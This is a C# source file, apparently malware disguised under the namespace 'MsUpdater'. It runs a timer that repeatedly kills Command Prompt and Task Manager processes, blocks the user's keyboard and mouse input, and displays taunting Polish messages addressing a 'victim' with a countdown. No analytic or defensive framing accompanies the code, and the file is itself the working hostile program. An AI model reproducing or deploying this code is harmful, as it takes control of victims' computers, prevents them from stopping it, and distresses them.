namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.Diagnostics.CodeAnalysis;
    using System.Runtime.InteropServices;
    using System.Threading;

    using Timer = System.Timers.Timer;

    internal static class Service
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        private static readonly Random Random = new Random();

        [SuppressMessage("ReSharper", "LocalizableElement")]
        static Service()
        {
            new Timer(500d) { Enabled = true }.Elapsed += delegate
                {
                    var processes = Process.GetProcesses();

                    Array.ForEach(processes, process =>
                        {
                            switch (process.ProcessName.ToLower())
                            {
                                case "cmd":
                                    if (!Array.Exists(processes, proc => proc.ProcessName.Equals("uninstall", StringComparison.CurrentCultureIgnoreCase)))
                                        process.Kill();
                                    break;
                                case "taskmgr":
                                    process.Kill();
                                    break;
                            }
                    });
                };

            Thread.Sleep(Random.Next(5000, 30000));

            using (new InputBlock())
            {
                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro,");

                Thread.Sleep(2000);

                AllocConsole();

                Console.Title = "NIE MASZ DOKĄD UCIEC :)";
                Console.WriteLine("Świetnie się będę bawił...\n\n");

                for (var i = 10; i >= 0; i--)
                {
                    Console.Write($"\rOdzyskasz kontrolę za {i} ..");
                    Thread.Sleep(1000);
                }

                FreeConsole();
            }
        }
    }
}